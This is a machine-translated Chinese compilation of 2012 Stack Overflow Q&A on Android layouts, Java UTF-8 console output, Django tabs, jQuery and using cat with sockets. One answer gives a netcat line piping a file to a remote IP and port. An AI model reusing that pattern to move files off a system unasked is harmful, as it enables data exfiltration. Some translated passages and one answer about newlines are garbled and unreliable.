> 
> 时间：2012-08-13T02:22:56.257
> 
> 标签：java, android, android-ui

我正在开发一个需要绘制如下 UI 的 android 项目。我需要将android屏幕分成两半。在上半部分，我需要展示 google mps。在下半部分，只要有人点击`Google Maps`. 上半部分已经完成，它对我有用。

**问题陈述：-**

我在为下半部分设计 UI 时遇到了麻烦。`main.xml file`下面的 UI应该是什么。每当我点击`markers on the Map`时，`information`Android 屏幕的下半部分应该会显示 。下面是我在包含图像的油漆和 android 屏幕下半部分的用户信息上所做的设计。

![在此处输入图像描述](../Images/cdc1b80d4cb47beade0f350aee24bc41.png)

这是我目前所拥有的`main.xml file`，我需要对其进行修改以使其看起来像上图。

```
<?xml version="1.0" encoding="utf-8"?> 
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" 
    android:layout_width="fill_parent" 
    android:layout_height="fill_parent" 
    android:orientation="vertical" > 

    <com.google.android.maps.MapView 
        android:id="@+id/mapView" 
        android:layout_width="fill_parent" 
        android:layout_height="fill_parent" 
        android:layout_weight="1" 
        android:apiKey="0vAX8Xe9xjo5gkFNEEIH7KdHkNZNJWNnsjUPKkQ" 
        android:clickable="true" 
        android:enabled="true" /> 

    <TextView 
        android:id="@+id/textView" 
        android:layout_width="fill_parent" 
        android:layout_height="fill_parent" 
        android:layout_weight="1" 
        android:text="TextView" /> 

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T02:45:15.637

你可以试试这个：

```
<?xml version="1.0" encoding="utf-8"?> 
<LinearLayout 
    xmlns:android="http://schemas.android.com/apk/res/android" 
    android:layout_width="fill_parent" 
    android:layout_height="fill_parent" 
    android:orientation="vertical" > 

    <com.google.android.maps.MapView 
        android:id="@+id/mapView" 
        android:layout_width="fill_parent" 
        android:layout_height="0dp" 
        android:layout_weight="1" 
        android:apiKey="0vAX8Xe9xjo5gkFNEEIH7KdHkNZNJWNnsjUPKkQ" 
        android:clickable="true" 
        android:state_enabled="true" /> 

    <LinearLayout 
        xmlns:android="http://schemas.android.com/apk/res/android" 
        android:layout_width="fill_parent" 
        android:layout_height="0dp"
        android:layout_weight="1"
        android:baselineAligned="false" 
        android:orientation="horizontal">

        <LinearLayout 
            xmlns:android="http://schemas.android.com/apk/res/android" 
            android:layout_width="0dp" 
            android:layout_height="fill_parent"
            android:layout_weight="0.7" 
            android:orientation="vertical">

            <ImageView 
                android:src="@drawable/icon"
                android:layout_width="wrap_content" 
                android:layout_height="wrap_content"
                android:layout_gravity="center"
                android:layout_marginTop="45dp"
            />

     </LinearLayout>

     <LinearLayout 
        xmlns:android="http://schemas.android.com/apk/res/android" 
        android:layout_width="0dp" 
        android:layout_height="fill_parent"
        android:layout_weight="1" 
        android:orientation="vertical">

       <TextView 
            android:id="@+id/textView1" 
            android:layout_width="wrap_content" 
            android:layout_height="wrap_content"                
            android:layout_marginTop="45dp"          
            android:text="Name:" />

       <TextView 
            android:id="@+id/textView2" 
            android:layout_width="wrap_content" 
            android:layout_height="wrap_content"                 
            android:text="Gender:" />  

       <TextView 
            android:id="@+id/textView3" 
            android:layout_width="wrap_content" 
            android:layout_height="wrap_content"                 
            android:text="Distance:" />        

       <TextView 
            android:id="@+id/textView4" 
            android:layout_width="wrap_content" 
            android:layout_height="wrap_content"                 
            android:text="Latitude:" />

       <TextView 
            android:id="@+id/textView5" 
            android:layout_width="wrap_content" 
            android:layout_height="wrap_content"                 
            android:text="Longitude:" /> 
    </LinearLayout> 

  </LinearLayout>

</LinearLayout> 
```

![在此处输入图像描述](../Images/34834eabda722f133f35e3425f6882e1.png)

希望这就是你要找的。

# java - Java、Unicode、UTF-8 和 Windows 命令提示符

> ID：11927518
> 
> 赞同：14
> 
> 时间：2012-08-13T02:23:48.080
> 
> 标签：java, windows, unicode, utf-8, command-prompt

我有一个 jar 文件，它应该读取一个 UTF-8 编码文件——我在 Windows 下的文本编辑器中编写的——并将字符显示到屏幕上。在 OS X 和 Linux 下，这可以完美运行。我在让它在 Windows 下工作时遇到了一些麻烦......我已经定义了一个读者和作者，如下所示：

```
FileInputStream file = new FileInputStream(args[0]);
InputStreamReader reader = new InputStreamReader(file, "UTF8");

PrintStream writer = new PrintStream(System.out, true, "UTF8"); 
```

我还按顺序将命令提示符字体更改`Lucida Console`为 UTF-8，并将字符编码更改为 UTF-8 `chcp 65001`。

现在，当我运行时`java -jar Read.jar file.txt`，提示会挥霍这一点。

```
áéí
ñóú
[]óú
[] 
```

但是，如果我运行`type file.txt`，提示符会正确显示文件的内容。

```
áéí
ñóú 
```

我已经尝试在有和没有 BOM 的情况下保存我的文件，但这并没有什么不同。（UTF-8 甚至不需要 BOM，因为它缺乏字节序，对吗？）我尝试用 编译`javac -encoding utf8 *.java`，但同样的事情发生了。

我现在没有主意了。有人愿意帮忙吗？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-13T08:34:57.173

代码页 65001 已损坏。MS C 运行时 stdio 函数在 65001 下运行时返回读取和写入的字节数不准确，这会导致类似这样的奇怪行为。

它是不可修复的——您不能从使用 C 标准库字节 I/O 函数（包括 Java）的应用程序中可靠地使用 Windows 控制台进行 Unicode I/O。您可以通过调用 Win32 API 函数 WriteConsoleW 将 Unicode 内容直接发送到控制台来破解它，但是您必须担心检测 stdout 何时实际上是控制台（未重定向到文件）。

这是一个长期存在的问题，MS 对修复没有兴趣。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T02:39:20.460

看起来它可能是你换行符。当我在标准英语 ISO-8859-1 中制作换行符时，我使用 char[] 数组，因为 Windows 字符 '\r' 和'\n' 和 UNIX/Linux 仅 \r 作为换行符。赢得 4 个字节，unix 2 个字节。不是，在字符转换器类的 API 文档中，编码转换系统可能会留下虚假字节，以丢弃依赖于编码和字符大小要求的字节。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T09:23:15.010

尝试使用 BufferReader 像这样读取您的文件；

```
 BufferedReader in = new BufferedReader(
       new InputStreamReader(
                  new FileInputStream(file), "UTF8")); 
```

# javascript - HTML5 iFrame 沙盒是否计算观看次数？

> ID：11927519
> 
> 赞同：-1
> 
> 时间：2012-08-13T02:24:04.167
> 
> 标签：javascript, html, iframe, google-analytics

设置 html5 iframe`sandbox`属性是否会停止谷歌分析测量页面浏览量，因为设置沙箱时不允许使用脚本？

```
<iframe id="iframe_auto" src="" scrolling="yes" sandbox=""></iframe> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:12:36.123

空的沙盒属性将不允许脚本运行，因此 Google 分析不会在 iframe 内运行，因为它 100% 依赖于 JavaScript。

# android - 当用户在联系人列表中单击返回或取消时如何处理空光标？

> ID：11927523
> 
> 赞同：0
> 
> 时间：2012-08-13T02:24:19.247
> 
> 标签：android

当用户在联系人列表中时，他/她应该从联系人列表中选择一个人，联系人活动将关闭并调用onActivityResult()；但是当我点击联系人页面上角的后退按钮或取消按钮时，光标将为空，并且出现空指针异常。和想法？

代码：

```
selectContactButton.setOnClickListener(new OnClickListener()
        {

            public void onClick(View v)
            {
                Intent intent = new Intent(Intent.ACTION_PICK);
                 intent.setType(ContactsContract.Contacts.CONTENT_TYPE);
                 startActivityForResult(intent, PICK_CONTACT);
            }
        });

public void onActivityResult(int requestCode, int resultCode, Intent intent) 
    {

      if (requestCode == PICK_CONTACT)   //I tried to do if intent!=null then run this codes but there is the same error
      {         

          Cursor cursor =  managedQuery(intent.getData(), null, null, null, null);
          cursor.moveToNext();

           String  name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)); 

          editName.setText(name); //edittext view

      }

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T02:47:27.867

在游标上调用 moveToFirst，并测试它返回的值。

# html - 如何编码这个标题设计？

> ID：11927526
> 
> 赞同：3
> 
> 时间：2012-08-13T02:25:41.993
> 
> 标签：html, css

![我正在谈论的标题](../Images/1fd98c3dab88783f6aca7329cfafa63d.png)

我最近从一个潜在客户那里收到了这个设计，虽然我们不同意一起工作，但我打算尝试为一些实践编写设计代码。这不是我的设计（我也没有声称它是），我也不打算将它用于任何事情，纯粹是为了练习。这也是我屏蔽公司名称的原因。

无论如何，当谈到这个标题/导航区域时，我很困惑。标志侧面的装饰，以及基本上跨越两个 div 的标志，真的让我大吃一惊。我想知道你们中的任何人将如何进行编码。

我在想每个侧面装饰只需要一个 div，然后徽标必须绝对定位。这是一个正确的解决方案吗？

我什至首先尝试将其合并到 960grid 系统中，但由于徽标跨越问题使网格变得非常困难，因此无济于事。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T02:31:25.283

我会使用一个列表并在第三个项目上添加一个类，以给它足够大的`margin-right`空间来为`h1`徽标创建空间。这样你的标记是好的和语义的，你不必使用多个`div`'s 和列表。

您也可以使用`nth-child`CSS 选择器而不是添加类。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T02:33:31.280

你有没有看到如果客户购买了字体，你总是可以对字体进行字体处理，这会让你更容易。

除此之外，我会删除链接和文本之间的点并使用图像作为背景，然后只需创建一个 UL，为每个 li 为页面提供一个类，即主页、关于、画廊，然后使用一些 PHP 来添加 current_page 类.

然后在画廊创建另一个 li 之后，使用以下标记：

```
<li class="logo"><a href="/">Logo</a></li> 
```

像这样添加样式。

```
li.logo {
    background: transparent url(....) no-repeat;
    width: width of logo;
    height: height of logo;
    display: block;
    overflow: hidden;
}

li.logo a {
    text-indent: -9999px;
    width: 100%;
    height: 100%;
    display: block;
    overflow: hidden;
} 
```

如果您希望我为您做这件事，或者向您展示示例，我将很乐意。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T02:59:26.300

我会将设计分成两行，如下所示：

![在此处输入图像描述](../Images/64eedb6b9662d79cf32be87b3333a6b3.png)

“设计”位可以位于第一排中心徽标图像的任一侧。这使您可以链接徽标，但不能链接设计。第二行被分割为导航元素和徽标。我会将它全部放在一个 div 中，该 div 具有设定的宽度和高度，这是所有各种图像的确切尺寸。把事情简单化。您可以将行放入单独的 div 中，但我认为没有它您会没事的。

对于超低预算的实施，请按原样使用图像并对其应用图像映射以添加您需要的链接。你会失去像翻转图像这样的选项，但这就​​是它的低预算。

由于这是一个学习练习，请尝试使用几种不同的方式对其进行编码。浮动所有元素，绝对定位它们，制作列，制作行，使用大背景图像并将导航定位在它上面，以及您能想到的任何其他东西 - 但没有表格！:)

# castle-windsor - 将依赖项映射到现有组件的属性

> ID：11927529
> 
> 赞同：1
> 
> 时间：2012-08-13T02:26:00.627
> 
> 标签：castle-windsor

是否有指定依赖项映射到容器中已有对象的属性的快捷方式？我知道我可以写一个工厂方法来做到这一点，只是想知道是否有更优雅的方式。

我可以指定组件 A 具有映射到组件 B 实例的依赖项，方法是命名 A，然后为 B 编写安装程序，如下所示：

```
container.Register(Component.For<IMdiController>()
                        .ImplementedBy<MdiController>()
                        .DependsOn(Dependency.OnComponent("shell", "shell"))); 
```

在此示例中，假设依赖项“shell”不映射到组件“shell”，而是映射到该组件的属性（例如，“shell.SomeProperty” - 我已经尝试过这种点语法，但它不起作用）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T06:54:22.833

我可能没有正确理解您的问题，但也许您想要的是这里的[动态参数](http://docs.castleproject.org/Windsor.Inline-Dependencies.ashx)。

以下是文档中对此属性的描述：

> > 有时您需要提供依赖项，直到组件创建时才知道。例如，假设您需要服务的创建时间戳。你在注册的时候就知道如何获取它，但是你不知道它的具体值是多少（而且确实每次创建一个新实例都会不同）。在这种情况下，您使用 DynamicParameters 方法。

在您的情况下，您可以执行以下操作，以便在从容器解析`SomeProperty`的组件上调用该属性`Shell`，以获取`something`依赖项的值。

```
container.Register(
    Component
        .For<IMdiController>()
        .ImplementedBy<MdiController>()
        .DynamicParameters((k, d) => d["something"] = k.Resolve<Shell>().SomeProperty)); 
```

我不确定像这样调用 resolve 是否对您有影响，但也许没关系。

# python - Django 和 Bootstrap：知道哪个选项卡处于活动状态

> ID：11927532
> 
> 赞同：4
> 
> 时间：2012-08-13T02:26:44.667
> 
> 标签：python, html, django, twitter-bootstrap

一般网络开发新手在这里。我的背景是 Java，但最近我一直在玩 Django + Bootstrap 网站。

我目前正在做一个有趣的小项目，但遇到了一个关于我希望 Bootstrap 中的选项卡如何工作的问题。

这里的上下文是用户可以记录他们使用这些 Django 生成的表单完成的锻炼。星期几是页面顶部的选项卡。

**我如何知道服务器端哪个选项卡处于活动状态，以便我可以正确地将锻炼提交到数据库中的正确位置？**

显而易见的解决方案是制作 7 种不同的形式，但必须有一个更好的解决方案，我太新手了，看不到。

这是我的html正文：

```
 <body>
    <div class ="container-fluid">
        <div class = "span8 offset4">
            <ul id="myTab" class="nav nav-tabs">
              <li class="active"><a href="#Mon" data-toggle="tab"><h3>Mon</h3></a></li>
              <li><a href="#Tues" data-toggle="tab"><h3>Tues</h3></a></li>
              <li><a href="#Wed" data-toggle="tab"><h3>Wed</h3></a></li>
              <li><a href="#Thu" data-toggle="tab"><h3>Thu</h3></a></li>
              <li><a href="#Fri" data-toggle="tab"><h3>Fri</h3></a></li>
              <li><a href="#Sat" data-toggle="tab"><h3>Sat</h3></a></li>
              <li><a href="#Sun" data-toggle="tab"><h3>Sun</h3></a></li>
            </ul>
            <div class="tab-content">
              <div class="tab-pane fade in active " id="Mon">
                <div class="accordion" id="accordion2">  
                 <div class="accordion-group">  
                    <div class="accordion-heading">  
                      <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseWarmup">  
                      <h2>Warmup</h2> </a>
                    </div>
                    <div id="collapseWarmup" class="accordion-body collapse" style="height: 0px; ">  
                        <div class="accordion-inner">  
                          <table class="table">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Sets</th>
                                    <th>Reps</th>
                                    <th>Distance</th>
                                    <th>Intensity</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for exercise in mon.warmup.all %}
                                    <tr>
                                        <td>{{ exercise.name }} </td>
                                        {% if exercise.sets %}
                                            <td>{{ exercise.sets }} </td>
                                        {% else %}
                                            <td> </td>
                                        {% endif %}
                                        {% if exercise.reps %}
                                            <td>{{ exercise.reps }} </td>
                                        {% else %}
                                            <td> </td>
                                        {% endif %}
                                        {% if exercise.distance %}
                                            <td>{{ exercise.distance }}m </td>
                                        {% else %}
                                            <td> </td>
                                        {% endif %}
                                        {% if exercise.intensity %}
                                            <td>{{ exercise.intensity }}</td>
                                        {% else %}
                                            <td> </td>
                                        {% endif %}
                                    </tr>
                                {% endfor %}
                            </tbody>
                            </table>
                                <form name="warmupform" class="well form-inline" action="{% url editworkout %}" method="post" enctype="multipart/form-data">
                                    {% csrf_token %}
                                    <p>{{ warmupform.as_p }}
                                    </p>
                                    <p><button type="submit" name="warmupsubmit" class="btn btn-primary">Submit Workout</button></p>
                                </form>
                          </div> <!-- accordian inner -->
                        </div>  <!-- collapseone -->
                    </div>  <!-- accordian group -->
                 <div class="accordion-group">  
                    <div class="accordion-heading">  
                      <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseWorkout">  
                      <h2>Workout</h2> </a>
                    </div>
                    <div id="collapseWorkout" class="accordion-body collapse" style="height: 0px; ">  
                        <div class="accordion-inner">  
                          <table class="table">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Sets</th>
                                    <th>Reps</th>
                                    <th>Distance</th>
                                    <th>Intensity</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for exercise in mon.intervalworkout.all %}
                                    <tr>
                                        <td>{{ exercise.name }} </td>
                                        {% if exercise.sets %}
                                            <td>{{ exercise.sets }} </td>
                                        {% else %}
                                            <td> </td>
                                        {% endif %}
                                        {% if exercise.reps %}
                                            <td>{{ exercise.reps }} </td>
                                        {% else %}
                                            <td> </td>
                                        {% endif %}
                                        {% if exercise.distance %}
                                            <td>{{ exercise.distance }}m </td>
                                        {% else %}
                                            <td> </td>
                                        {% endif %}
                                        {% if exercise.intensity %}
                                            <td>{{ exercise.intensity }}</td>
                                        {% else %}
                                            <td> </td>
                                        {% endif %}
                                    </tr>
                                {% endfor %}
                            </tbody>
                            </table>
                                <form name="intervalform" class="well form-inline" action="{% url editworkout %}" method="post" enctype="multipart/form-data">
                                    {% csrf_token %}
                                    <p>{{ intervalform.as_p }}
                                    </p>
                                    <p><button type="submit" name="intervalsubmit" class="btn btn-primary">Submit Workout</button></p>
                                </form>
                          </div> <!-- accordian inner -->
                        </div>  <!-- collapseone -->
                    </div>  <!-- accordian group -->
                 <div class="accordion-group">  
                    <div class="accordion-heading">  
                      <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion2" href="#collapseWeights">  
                      <h2>Strength Training</h2> </a>
                    </div>
                    <div id="collapseWeights" class="accordion-body collapse" style="height: 0px; ">  
                        <div class="accordion-inner">  
                          <table class="table">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Sets</th>
                                    <th>Reps</th>
                                    <th>Intensity</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for exercise in mon.strengthtraining.all %}
                                    <tr>
                                        <td>{{ exercise.name }} </td>
                                        {% if exercise.sets %}
                                            <td>{{ exercise.sets }} </td>
                                        {% else %}
                                            <td> </td>
                                        {% endif %}
                                        {% if exercise.reps %}
                                            <td>{{ exercise.reps }} </td>
                                        {% else %}
                                            <td> </td>
                                        {% endif %}
                                        {% if exercise.intensity %}
                                            <td>{{ exercise.intensity }}</td>
                                        {% else %}
                                            <td> </td>
                                        {% endif %}
                                    </tr>
                                {% endfor %}
                            </tbody>
                            </table>
                                <form name="strengthtrainingform" class="well form-inline" action="{% url editworkout %}" method="post" enctype="multipart/form-data">
                                    {% csrf_token %}
                                    <p>{{ strengthform.as_p }}
                                    </p>
                                    <p><button type="submit" name="strengthtrainingsubmit" class="btn btn-primary">Submit Workout</button></p>
                                </form>
                          </div> <!-- accordian inner -->
                        </div>  <!-- collapseone -->
                    </div>  <!-- accordian group -->
                </div>  <!-- accordian 2 -->
            </div><!-- tabpane -->
                      <div class="tab-pane fade in " id="Tues">PROFILE ... Raw denim you probably haven't heard of them jean shorts Austin. Nesciunt tofu stumptown aliqua, </div>
                      <div class="tab-pane fade in " id="Wed">MESSAGES ... Aliquip placeat salvia cillum iphone. </div>
                      <div class="tab-pane fade in " id="Thu">SETTING ... Seitan aliquip quis cardigan american apparel, butcher voluptate nisi qui.</div>
                      <div class="tab-pane fade in " id="Fri">PROFILE ... Raw denim you probably haven't heard of them jean shorts Austin. Nesciunt tofu stumptown aliqua, </div>
                      <div class="tab-pane fade in " id="Sat">MESSAGES ... Aliquip placeat salvia cillum iphone. </div>
                      <div class="tab-pane fade in " id="Sun">SETTING ... Seitan aliquip quis cardigan american apparel, butcher voluptate nisi qui.</div>
        </div><!-- tabcontent -->
    </div> <!-- span6 -->
</div> <!-- container fluid -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>  
    <script src="{{ STATIC_URL }}Bootstrap/js/bootstrap.js"></script>  
    <script type='text/javascript'>//<![CDATA[ 
    $(function(){
    $('#myTab a').click(function(e) {
        e.preventDefault();
        $(this).tab('show');
    })

    $('#myTab a:first').tab('show');

    });//]]>  
    </script>
</body> 
```

我当前处理该页面的视图：

```
def editworkout(request):
day = DayModel.objects.get(id=1) #for testing purposes, until tabs are figured out
if request.method == 'POST': 
    if 'strengthtrainingsubmit' in request.POST:
        form = StrengthExerciseForm(request.POST)
        if form.is_valid():
            day.strengthtraining.add(form.save()) #saves the model and returns its
            return HttpResponseRedirect(reverse('editworkout'))
    if 'intervalsubmit' in request.POST:
        form = IntervalForm(request.POST)
        if form.is_valid():
            day.intervalworkout.add(form.save());
            return HttpResponseRedirect(reverse('editworkout'))
    if 'warmupsubmit' in request.POST:
        form = AbstractExerciseForm(request.POST)
        if form.is_valid():
            day.warmup.add(form.save());
            return HttpResponseRedirect(reverse('editworkout'))            
else:
        warmupform = AbstractExerciseForm()
        intervalform = IntervalForm()
        strengthform = StrengthExerciseForm()  
        return render_to_response('editworkout.html',
                          { 'mon':day,
                           'warmupform':warmupform,
                           'intervalform':intervalform,
                           'strengthform':strengthform, },
                          context_instance=RequestContext(request)
                         ) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T04:13:54.003

您可以在表单中添加一个隐藏字段来标识您正在提交的选项卡/表单，或者您可以为每个表单设置不同的 URL 来提交。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T03:59:42.090

您无法在服务器端知道，除非您的 javascript 告诉它（[在此处](https://stackoverflow.com/questions/1760250/how-to-tell-if-browser-tab-is-active)解决）。这是因为浏览器不会在页面焦点上向后端发送更多信息，因此您将在服务器端处于黑暗中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-05T17:27:36.860

day = DayModel.objects.get(id=1) #用于测试目的，直到找出选项卡

假设 day=sunday 或 monday 或 tuesday 像字符串。现在你可以把 if 标签放在里面

*   检查日期并将 class="active" 放入 if 条件中。因此，只要条件匹配，该类将在特定日期处于活动状态。

    ```
    <ul id="myTab" class="nav nav-tabs">
              <li {%if day == "monday"%} class="active"{%endif%}><a href="#Mon" data-toggle="tab"><h3>Mon</h3></a></li>
              <li{%if day == "tuesday"%} class="active"{%endif%}><a href="#Tues" data-toggle="tab"><h3>Tues</h3></a></li>
              <li {%if day == "wednesday"%} class="active"{%endif%}><a href="#Wed" data-toggle="tab"><h3>Wed</h3></a></li>
    .
    .
    .
    </ul> 
    ```

# ruby - 如何为使用 class_eval 定义的方法添加 RDoc 文档？

> ID：11927534
> 
> 赞同：9
> 
> 时间：2012-08-13T02:27:13.590
> 
> 标签：ruby, metaprogramming, rdoc

我`class_eval`用来更简洁地定义一堆重复的方法，如下所示：

```
%w{greasy chunky bacon}.product(%w{flying sky poodle}).each do |a,b|
  class_eval "def #{a}_#{b}; do_something; end"
end 
```

我希望所有生成的方法都包含在 RDoc 文档中。是否有一个 RDoc 指令“手动”将一个方法添加到类的方法列表中？我找不到一个。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-13T12:47:11.133

*请*参阅. _ *_* _ [_`RDoc::Parser::Ruby`](http://Docs.SeattleRb.Org/rdoc/RDoc/Parser/Ruby.html)

在您的情况下，您会执行以下操作：

```
##
# :method: greasy_flying
# Makes grease fly.

##
# :method: chunky_poodle
# This is a really gruesome method. Ewww! 
```

等等。

# sockets - 如何将猫与套接字一起使用？

> ID：11927542
> 
> 赞同：5
> 
> 时间：2012-08-13T02:28:09.203
> 
> 标签：sockets, unix, cat

在阅读命令源代码时`cat`，我发现`cat`命令支持从套接字读取。[您可以在http://src.gnu-darwin.org/src/bin/cat/cat.c.html](http://src.gnu-darwin.org/src/bin/cat/cat.c.html)查看源代码。但我从来没有在 socket 中使用过这个命令：只是快速查看一个文件或连接多个文件。我可以用`cat`+ 套接字做什么？你能举一个有趣的例子来说明使用`cat`从套接字读取命令吗？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T02:36:47.793

使用“netcat”，在 unix/linux 上是命令`nc`。你很可能想成为客户端套接字，所以像`cat <filename> | nc <ip> <port>`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T04:04:15.690

您找到的 cat 源代码包含一些在您尝试 cat 套接字时调用 socket() 和 connect() 的魔力。它不包含任何listen() 或accept()，所以它不可能做“服务器端”的事情。它适用于 unix 域套接字，而不是 inet 套接字，所以不要认为它是用于在实际网络中搜索东西。Unix 域套接字只是本地进程间通信的端点。

我无法想象当他们将这个功能添加到 cat 时他们想到了什么用例。

# android - 在 Android 的同一布局中选择 EditText 时如何专注于 Webview？

> ID：11927549
> 
> 赞同：2
> 
> 时间：2012-08-13T02:29:51.020
> 
> 标签：android, webview, android-edittext, focus

我一直在尝试在布局中添加 EditTexts 和 WebView。问题在于专注于 WebView。在决定再次询问之前，我试图查看网络和 Stackoverflow 上的答案。

在 webview 中，我需要填写一些字段，这些字段是通过 POST 发送的。如果我先选择 Webview（然后在字段中输入值），那很好。但是，如果我先选择 EditTexts，我将无法专注于 Webview 来填写网页上的字段，尽管似乎另一个光标与 EditText 部分中的光标平行设置。生成的网页包含一些我需要添加到 EditTexts 的信息。

到目前为止我的代码：

```
public class LoadWebandEditText extends Activity {

@Override
public void onCreate(Bundle savedInstanceState){
    super.onCreate(savedInstanceState);

    setContentView(R.layout.oauth_signin);
    final WebView webpage = (WebView)findViewById(R.id.webview_page);
    webpage.setWebViewClient(new WebViewClient());
    webpage.loadUrl("www.towardsmypage.com");

    Button btn_next = (Button)findViewById(R.id.btn_next);
    final EditText edittext_1 = (EditText)findViewById(R.id.editText_1); 
    final EditText edittext_2 = (EditText)findViewById(R.id.EditText_2);

    webpage.setOnClickListener(new View.OnClickListener() {
          public void onClick(View v) {
              webpage.requestFocus();
              webpage.setFocusable(true);
          }
        });

    webpage.setOnFocusChangeListener(new OnFocusChangeListener(){

        public void onFocusChange(View arg0, boolean hasFocus) {

            if (!hasFocus){
                webpage.requestFocus();
                webpage.setFocusable(true);
            }
        }
 }); 
```

我的 Layout.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <WebView
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/webview_page"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_weight="0.7" 
        android:focusable="true"/>

    <TextView
            android:id="@+id/TextView01"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:paddingLeft="15dip"
            android:text="Enter Field Information 1"
            android:textSize="18dp"
            android:textStyle="bold"
            android:typeface="sans" />

    <EditText
        android:id="@+id/editText_1"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:ems="10"
        android:inputType="textPassword" >

    </EditText>

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:paddingLeft="15dip"
        android:text="Enter Field Information 2"
        android:textSize="18dp"
        android:textStyle="bold"
        android:typeface="sans" />

    <EditText
        android:id="@+id/EditText_2"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:ems="10"
        android:inputType="textPassword" />

    <Button
        android:id="@+id/btn_next"
        style="?android:attr/buttonStyleSmall"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Button" 
        android:layout_gravity="center_horizontal" />
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T02:44:00.700

几周前我遇到了同样的问题。答案很简单，给webview设置一个onTouchListener，然后设置如下：

```
public boolean onTouch(View v, MotionEvent event) {
    switch (event.getAction()) {
    case MotionEvent.ACTION_DOWN:
    case MotionEvent.ACTION_UP:
        if (!v.hasFocus()) {
            v.requestFocus();
        }
        break;
    }
    return false;
} 
```

**编辑：** 事实上，我在“相关”类别中找到了一个完全相同的副本，请阅读[此](https://stackoverflow.com/questions/4293965/android-webview-focus-problem)。

让我知道它是否不是您要找的。

# javascript - 如何使用 jquery 添加弹出窗口？

> ID：11927557
> 
> 赞同：0
> 
> 时间：2012-08-13T02:31:47.703
> 
> 标签：javascript, jquery

我的html代码：

```
<form id="room-from" method="post">
<input id="room" type="text" name="room" />
<input type="submit" id="save" name="save" />
</form> 
```

如果房间文本字段为空，当我按下保存按钮时，屏幕中央会出现一个弹出窗口，并且必须说输入房间号。

jQuery：

```
 $("#save").submit(function(){
    if ( $("#room").val() == "")
{

}
    }); 
```

我不知道该怎么做。

谁能帮我解决这个问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T02:36:16.013

你应该使用模态窗口和 jQuery UI 它会让你的生活变得轻松

[http://jqueryui.com/demos/dialog/](http://jqueryui.com/demos/dialog/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T02:33:50.213

更新：添加取消提交。

```
 $("#save").submit(function(event){
        if ( $("#room").val() == "")
        {
                alert("enter a room number");
                event.preventDefault();
        }
   }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T02:37:04.133

```
$("#save").submit(function(){
    if ( $("#room").val() == "") {
        $("#site_blackout").fadeIn(200);
        $("#popup_modal").fadeIn(400);
    }
}); 
```

然后只需使用 CSS 将 popup_modal 居中并设置 site_blackout 的样式。

# c# - Windows 8 SDK 是否支持 SQL Server Compact Edition？

> ID：11927558
> 
> 赞同：1
> 
> 时间：2012-08-13T02:31:50.400
> 
> 标签：c#, .net, windows-8, microsoft-metro

> **可能重复：**
> [Windows 8 应用程序的嵌入式数据库](https://stackoverflow.com/questions/8655186/embedded-database-for-windows-8-app)

我当前适用于 Windows 7 的应用程序使用 SQL Server Compact Edition 的实体框架代码。Windows 8 SDK 是否支持该技术？我们如何开发基于数据库的 Windows 8 应用程序？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T03:46:45.173

不，不是的。此外，ADO.NET 不是 Metro 风格应用程序可用的 .NET Core 配置文件的一部分。通过 Web 服务进行远程存储显然是一种潜在的模式，但如果您绝对需要本地数据库，这里有一个来自 Tim Heuer 关于如何将 SQLite 与 Windows 8 Metro 风格应用程序一起使用的[好系列。](http://timheuer.com/blog/archive/2012/08/07/updated-how-to-using-sqlite-from-windows-store-apps.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T05:09:00.420

